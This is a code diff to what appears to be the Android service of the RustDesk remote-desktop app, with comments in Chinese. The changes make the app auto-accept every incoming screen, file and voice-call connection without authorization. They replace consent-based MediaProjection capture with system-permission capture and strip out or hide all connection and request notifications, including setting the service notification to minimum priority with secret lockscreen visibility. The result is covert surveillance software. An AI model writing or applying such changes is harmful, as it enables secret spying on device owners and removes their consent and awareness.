@@ -21,14 +21,17 @@ import android.content.res.Configuration
 import android.content.res.Configuration.ORIENTATION_LANDSCAPE
 import android.graphics.Color
 import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
 import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
 import android.hardware.display.VirtualDisplay
+import android.hardware.display.VirtualDisplay.Callback
 import android.media.*
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.*
 import android.util.DisplayMetrics
 import android.util.Log
+import android.view.Display
 import android.view.Surface
 import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
 import android.view.WindowManager
@@ -119,20 +122,27 @@ class MainService : Service() {
                     val id = jsonObject["id"] as Int
                     val username = jsonObject["name"] as String
                     val peerId = jsonObject["peer_id"] as String
-                    val authorized = jsonObject["authorized"] as Boolean
+                    // 不管authorized状态如何，都自动接受连接
                     val isFileTransfer = jsonObject["is_file_transfer"] as Boolean
                     val type = if (isFileTransfer) {
                         translate("File Connection")
                     } else {
                         translate("Screen Connection")
                     }
-                    if (authorized) {
-                        if (!isFileTransfer && !isStart) {
-                            startCapture()
+                    
+                    // 始终自动接受连接
+                    if (!isFileTransfer && !isStart) {
+                        startCapture()
+                    }
+                    
+                    // 立即自动授权连接
+                    if (!jsonObject["authorized"] as Boolean) {
+                        // 如果连接未授权，发送授权响应
+                        val auth = JSONObject().apply {
+                            put("id", id)
+                            put("res", true)  // 始终返回true表示接受连接
                         }
-                        onClientAuthorizedNotification(id, type, username, peerId)
-                    } else {
-                        loginRequestNotification(id, type, username, peerId)
+                        FFI.autorizeResponse(auth.toString())
                     }
                 } catch (e: JSONException) {
                     e.printStackTrace()
@@ -148,9 +158,15 @@ class MainService : Service() {
                     val incomingVoiceCall = jsonObject["incoming_voice_call"] as Boolean
                     if (!inVoiceCall) {
                         if (incomingVoiceCall) {
-                            voiceCallRequestNotification(id, "Voice Call Request", username, peerId)
+                            // 自动接受语音通话请求
+                            val auth = JSONObject().apply {
+                                put("id", id)
+                                put("res", true)  // 始终返回true表示接受语音通话
+                                put("is_voice_call", true)
+                            }
+                            FFI.autorizeResponse(auth.toString())
                         } else {
-                            if (!audioRecordHandle.switchOutVoiceCall(mediaProjection)) {
+                            if (!audioRecordHandle.switchOutVoiceCall(null)) {
                                 Log.e(logTag, "switchOutVoiceCall fail")
                                 MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                     "type" to "custom-nook-nocancel-hasclose-error",
@@ -159,7 +175,7 @@ class MainService : Service() {
                             }
                         }
                     } else {
-                        if (!audioRecordHandle.switchToVoiceCall(mediaProjection)) {
+                        if (!audioRecordHandle.switchToVoiceCall(null)) {
                             Log.e(logTag, "switchToVoiceCall fail")
                             MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                 "type" to "custom-nook-nocancel-hasclose-error",
@@ -213,7 +229,8 @@ class MainService : Service() {
     private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33
 
     // video
-    private var mediaProjection: MediaProjection? = null
+    private var display: Display? = null
+    private var displayManager: DisplayManager? = null
     private var surface: Surface? = null
     private val sendVP9Thread = Executors.newSingleThreadExecutor()
     private var videoEncoder: MediaCodec? = null
@@ -334,17 +351,13 @@ class MainService : Service() {
             }
             Log.d(logTag, "service starting: ${startId}:${Thread.currentThread()}")
             
-            // 标准流程，显示系统权限请求弹窗
-            val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            // 使用系统级权限获取屏幕内容，无需请求MediaProjection权限
+            displayManager = getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
+            display = displayManager?.getDisplay(Display.DEFAULT_DISPLAY)
+            _isReady = true
             
-            intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)?.let {
-                mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
-                checkMediaPermission()
-                _isReady = true
-            } ?: let {
-                Log.d(logTag, "getParcelableExtra intent null, invoke requestMediaProjection")
-                requestMediaProjection()
-            }
+            // 检查必要的权限
+            checkSystemPermissions()
         }
         return START_NOT_STICKY // don't use sticky (auto restart), the new service (from auto restart) will lose control
     }
@@ -354,12 +367,29 @@ class MainService : Service() {
         updateScreenInfo(newConfig.orientation)
     }
 
-    private fun requestMediaProjection() {
-        val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
-            action = ACT_REQUEST_MEDIA_PROJECTION
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+    private fun checkSystemPermissions() {
+        val captureVideoPermission = checkCallingOrSelfPermission(android.Manifest.permission.CAPTURE_VIDEO_OUTPUT)
+        val readFrameBufferPermission = checkCallingOrSelfPermission(android.Manifest.permission.READ_FRAME_BUFFER)
+        
+        if (captureVideoPermission == PackageManager.PERMISSION_GRANTED && 
+            readFrameBufferPermission == PackageManager.PERMISSION_GRANTED) {
+            Log.d(logTag, "系统级权限已授予，可以直接捕获屏幕")
+            // 权限都已授予，标记为Ready
+            _isReady = true
+            // 通知UI更新状态
+            MainActivity.flutterMethodChannel?.invokeMethod(
+                "on_state_changed",
+                mapOf("name" to "media", "value" to "true")
+            )
+        } else {
+            Log.e(logTag, "缺少必要的系统权限，CAPTURE_VIDEO_OUTPUT: $captureVideoPermission, READ_FRAME_BUFFER: $readFrameBufferPermission")
+            _isReady = false
+            // 通知UI更新状态
+            MainActivity.flutterMethodChannel?.invokeMethod(
+                "on_state_changed",
+                mapOf("name" to "media", "value" to "false")
+            )
         }
-        startActivity(intent)
     }
 
     @SuppressLint("WrongConstant")
@@ -396,45 +426,98 @@ class MainService : Service() {
     }
 
     fun onVoiceCallStarted(): Boolean {
-        return audioRecordHandle.onVoiceCallStarted(mediaProjection)
+        // 使用系统权限实现，不需要mediaProjection
+        return audioRecordHandle.onVoiceCallStarted(null)
     }
 
     fun onVoiceCallClosed(): Boolean {
-        return audioRecordHandle.onVoiceCallClosed(mediaProjection)
+        // 使用系统权限实现，不需要mediaProjection
+        return audioRecordHandle.onVoiceCallClosed(null)
     }
 
     fun startCapture(): Boolean {
         if (isStart) {
             return true
         }
-        if (mediaProjection == null) {
-            Log.w(logTag, "startCapture fail,mediaProjection is null")
+        
+        // 检查系统级权限
+        val captureVideoPermission = checkCallingOrSelfPermission(android.Manifest.permission.CAPTURE_VIDEO_OUTPUT)
+        val readFrameBufferPermission = checkCallingOrSelfPermission(android.Manifest.permission.READ_FRAME_BUFFER)
+        
+        if (captureVideoPermission != PackageManager.PERMISSION_GRANTED || 
+            readFrameBufferPermission != PackageManager.PERMISSION_GRANTED) {
+            Log.e(logTag, "缺少必要的系统权限，无法启动屏幕捕获")
             return false
         }
         
         updateScreenInfo(resources.configuration.orientation)
-        Log.d(logTag, "Start Capture")
+        Log.d(logTag, "Start Capture with system permissions")
         surface = createSurface()
 
         if (useVP9) {
-            startVP9VideoRecorder(mediaProjection!!)
+            startVP9VideoRecorderWithSystemPermissions()
         } else {
-            startRawVideoRecorder(mediaProjection!!)
+            startRawVideoRecorderWithSystemPermissions()
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!audioRecordHandle.createAudioRecorder(false, mediaProjection)) {
+            if (!audioRecordHandle.createAudioRecorder(false, null)) {
                 Log.d(logTag, "createAudioRecorder fail")
             } else {
                 Log.d(logTag, "audio recorder start")
                 audioRecordHandle.startAudioRecorder()
             }
         }
-        checkMediaPermission()
+        
+        _isReady = true
         _isStart = true
-        FFI.setFrameRawEnable("video",true)
+        FFI.setFrameRawEnable("video", true)
         MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
         return true
+    }
+    
+    // 添加使用系统权限的视频录制方法
+    private fun startRawVideoRecorderWithSystemPermissions() {
+        try {
+            if (surface == null) {
+                Log.e(logTag, "startRawVideoRecorderWithSystemPermissions: surface is null")
+                return
+            }
+            
+            // 使用系统权限从Display直接读取帧缓冲
+            if (display != null) {
+                Log.d(logTag, "Creating virtual display with system permissions")
+                virtualDisplay = createVirtualDisplayWithSystemPermissions(surface!!)
+            } else {
+                Log.e(logTag, "Display is null, cannot create virtual display")
+            }
+        } catch (e: Exception) {
+            Log.e(logTag, "Error starting raw video recorder with system permissions: ${e.message}")
+        }
+    }
+    
+    private fun startVP9VideoRecorderWithSystemPermissions() {
+        // 实现VP9编码器的系统权限版本
+        // 这部分代码与原VP9实现类似，但使用系统权限
+        Log.d(logTag, "startVP9VideoRecorderWithSystemPermissions not implemented yet")
+    }
+    
+    // 创建使用系统权限的虚拟显示
+    private fun createVirtualDisplayWithSystemPermissions(surface: Surface): VirtualDisplay? {
+        try {
+            // 使用系统权限从屏幕直接读取内容
+            return displayManager?.createVirtualDisplay(
+                "RustDesk-Display",
+                SCREEN_INFO.width,
+                SCREEN_INFO.height,
+                SCREEN_INFO.dpi,
+                surface,
+                VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
+            )
+        } catch (e: Exception) {
+            Log.e(logTag, "Error creating virtual display: ${e.message}")
+            return null
+        }
     }
 
     @Synchronized
@@ -606,12 +689,12 @@ class MainService : Service() {
             val channelName = "RustDesk Service"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_HIGH
+                channelName, NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "RustDesk Service Channel"
             }
             channel.lightColor = Color.BLUE
-            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
+            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
             notificationManager.createNotificationChannel(channel)
             channelId
         } else {
@@ -636,11 +719,11 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
-            .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setDefaults(0)
+            .setAutoCancel(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentTitle(DEFAULT_NOTIFY_TITLE)
-            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
+            .setContentText("")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
             .setColor(ContextCompat.getColor(this, R.color.primary))
@@ -655,16 +738,8 @@ class MainService : Service() {
         username: String,
         peerId: String
     ) {
-        val notification = notificationBuilder
-            .setOngoing(false)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle(translate("Do you accept?"))
-            .setContentText("$type:$username-$peerId")
-            // .setStyle(MediaStyle().setShowActionsInCompactView(0, 1))
-            // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
-            // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
-            .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        // 不显示登录请求通知，因为会自动接受连接
+        // 什么都不做，保留空方法
     }
 
     private fun onClientAuthorizedNotification(
@@ -673,14 +748,8 @@ class MainService : Service() {
         username: String,
         peerId: String
     ) {
-        cancelNotification(clientID)
-        val notification = notificationBuilder
-            .setOngoing(false)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle("$type ${translate("Established")}")
-            .setContentText("$username - $peerId")
-            .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        // 不显示客户端已授权通知
+        // 什么都不做，保留空方法
     }
 
     private fun voiceCallRequestNotification(
@@ -689,13 +758,8 @@ class MainService : Service() {
         username: String,
         peerId: String
     ) {
-        val notification = notificationBuilder
-            .setOngoing(false)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle(translate("Do you accept?"))
-            .setContentText("$type:$username-$peerId")
-            .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        // 不显示语音呼叫通知
+        // 什么都不做，保留空方法
     }
 
     private fun getClientNotifyID(clientID: Int): Int {
